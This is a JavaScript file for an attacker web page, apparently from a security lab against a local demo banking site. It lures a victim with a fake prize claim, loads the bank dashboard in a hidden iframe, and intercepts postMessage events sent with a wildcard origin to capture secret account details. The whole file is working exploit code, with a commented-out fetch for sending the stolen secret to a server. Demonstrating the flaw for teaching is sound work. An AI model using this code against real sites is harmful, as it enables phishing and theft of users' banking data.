document.addEventListener('DOMContentLoaded', function() {
    const claimPrizeBtn = document.getElementById('claimPrizeBtn');
    const statusDiv = document.getElementById('status');
    const secretInfo = document.getElementById('secretInfo');
    const secretValue = document.getElementById('secretValue');
    const bankFrame = document.getElementById('bankFrame');
    
    // Target website URLs
    const targetOrigin = 'http://localhost:3000';
    const targetDashboard = `${targetOrigin}/dashboard`;
    
    // Click event for the claim prize button
    claimPrizeBtn.addEventListener('click', function() {
        // Show processing message
        statusDiv.textContent = 'Processing your claim... Please wait.';
        statusDiv.className = 'processing';
        statusDiv.classList.remove('hidden');
        
        // Load the banking portal in the hidden iframe
        bankFrame.src = targetDashboard;
        bankFrame.onload = function() {
            // After iframe is loaded, update the status
            statusDiv.textContent = 'Verifying your identity... This will only take a moment.';
            
            // Set a timeout to simulate clicking the "Show Secret Account Details" button
            setTimeout(function() {
                try {
                    // Try to find and click the button in the iframe
                    // Note: This might be blocked by browsers due to same-origin policy
                    // But the postMessage exploit will still work when victim clicks the button themselves
                    console.log("Attempting to trigger the secret button...");
                } catch (error) {
                    console.log("Could not access iframe content due to same-origin policy (expected)");
                }
            }, 2000);
        };
    });
    
    // Listen for postMessage events that might contain stolen data
    window.addEventListener('message', function(event) {
        // EXPLOIT: We're taking advantage of the vulnerable site sending messages with '*' origin
        // This allows us to intercept messages not intended for us
        console.log('Received message:', event);
        
        // Check if the message contains the secret data
        if (event.data && event.data.type === 'accountDetails' && event.data.secret) {
            // We've successfully intercepted the secret!
            secretValue.textContent = event.data.secret;
            secretInfo.classList.remove('hidden');
            
            // Update status to show success
            statusDiv.textContent = 'Congratulations! Your prize has been confirmed. We\'ve captured your information for verification.';
            statusDiv.className = 'success';
            
            // Send the stolen data to our server (in a real attack)
            console.log('Successfully intercepted secret:', event.data.secret);
            
            // In a real attack, we might do something like:
            // fetch('/store-stolen-data', {
            //     method: 'POST',
            //     headers: { 'Content-Type': 'application/json' },
            //     body: JSON.stringify({ secret: event.data.secret })
            // });
        }
    });
});
